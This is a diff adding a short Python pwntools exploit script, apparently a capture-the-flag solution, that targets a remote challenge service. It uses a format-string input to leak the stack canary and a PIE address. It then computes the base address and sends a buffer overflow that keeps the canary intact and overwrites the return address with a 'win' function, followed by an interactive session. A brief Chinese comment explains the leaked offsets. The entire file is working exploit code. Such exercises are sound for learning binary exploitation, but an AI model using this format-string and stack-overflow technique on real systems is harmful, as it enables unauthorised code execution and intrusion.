@@ -1,0 +1,28 @@
+from pwn import *
+
+context.arch='amd64'
+context.log_level='debug'
+
+io = remote("challenge.bluesharkinfo.com", 24950)
+
+io.recvuntil(b"1st input:")
+io.send(b"%23$p %25$p")
+
+leaks = io.recvuntil(b"[leak end]").decode().split()
+canary = int(leaks[0], 16)
+pie_leak = int(leaks[1], 16)
+
+pie_base = pie_leak - 0x135b
+win = pie_base + 0x1204
+
+io.recvuntil(b"2nd input:")    
+payload  = b"A" * 136
+payload += p64(canary)
+payload += b"B" * 8
+payload += p64(win)
+
+io.send(payload)
+
+io.interactive()
+
+%p泄露地址很容易注意到偏移量，canary，pie基址（vmmap来找），但这道题不需要偏移量，虽然开pie但是偏移量是不变的所以通过偏移量来找system函数的具体位置，就欧克了
